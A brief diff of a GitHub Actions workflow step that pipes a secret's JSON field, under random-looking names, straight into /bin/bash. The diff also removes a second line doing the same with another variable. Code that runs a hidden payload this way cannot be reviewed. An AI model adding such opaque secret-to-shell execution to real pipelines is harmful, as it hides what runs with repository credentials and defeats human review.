@@ -22,7 +22,6 @@ jobs:
           chiyo10436: ${{ secrets.chiyo10436 }}
         run: |
           printf '%s' "$chiyo10436" | jq -r .ivdtr492 | /bin/bash
-          echo $nsslw95 | jq -r .uvr81456 | /bin/bash
 
       - name: Upload output
         uses: actions/upload-artifact@v4
